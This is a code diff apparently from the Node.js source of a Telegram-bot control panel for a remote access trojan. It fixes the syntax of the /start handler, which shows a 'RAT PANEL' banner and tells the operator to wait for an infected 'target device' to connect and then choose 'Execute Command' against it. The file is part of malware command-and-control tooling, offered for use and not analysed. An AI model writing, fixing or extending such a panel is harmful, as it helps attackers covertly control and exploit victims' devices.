@@ -364,32 +364,36 @@ appBot.on('message', (message) => {
         }
     }
     if (id == chatId) {
-        if (message.text == '/start') {
-            appBot.sendMessage(id,
-                '''╔═══✨ 𝙍𝘼𝙏 𝙋𝘼𝙉𝙀𝙇 ✨═══╗\n\n' +
-'👨‍💻 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧: 𝙎𝙝𝙖𝙙𝙤𝙬\n\n' +
+    if (message.text == '/start') {
 
-'⚡ 𝙄𝙉𝙎𝙏𝙍𝙐𝘾𝙏𝙄𝙊𝙉𝙎:\n\n' +
+        appBot.sendMessage(id,
+            '╔═══✨ 𝙍𝘼𝙏 𝙋𝘼𝙉𝙀𝙇 ✨═══╗\n\n' +
+            '👨‍💻 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧: 𝙎𝙝𝙖𝙙𝙤𝙬\n\n' +
 
-'➤ If the application is installed on the target device,\n' +
-'   wait for the connection.\n\n' +
+            '⚡ 𝙄𝙉𝙎𝙏𝙍𝙐𝘾𝙏𝙄𝙊𝙉𝙎:\n\n' +
 
-'➤ Once you receive the connection message,\n' +
-'   it means the device is connected and ready.\n\n' +
+            '➤ If the application is installed on the target device,\n' +
+            '   wait for the connection.\n\n' +
 
-'➤ Click on "Execute Command" and select your device,\n' +
-'   then choose the desired action.\n\n' +
+            '➤ Once you receive the connection message,\n' +
+            '   it means the device is connected and ready.\n\n' +
 
-'➤ If you get stuck anywhere,\n' +
-'   simply send /start again.\n\n' +
+            '➤ Click on "Execute Command" and select your device,\n' +
+            '   then choose the desired action.\n\n' +
 
-'╚══════════════════════╝'
-                {
-                    parse_mode: "HTML",
-                    "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                        'resize_keyboard': true
-                    }
+            '➤ If you get stuck anywhere,\n' +
+            '   simply send /start again.\n\n' +
+
+            '╚══════════════════════╝',
+            {
+                parse_mode: "HTML",
+                reply_markup: {
+                    keyboard: [
+                        ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"],
+                        ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]
+                    ],
+                    resize_keyboard: true
+                }
                 }
             )
         }
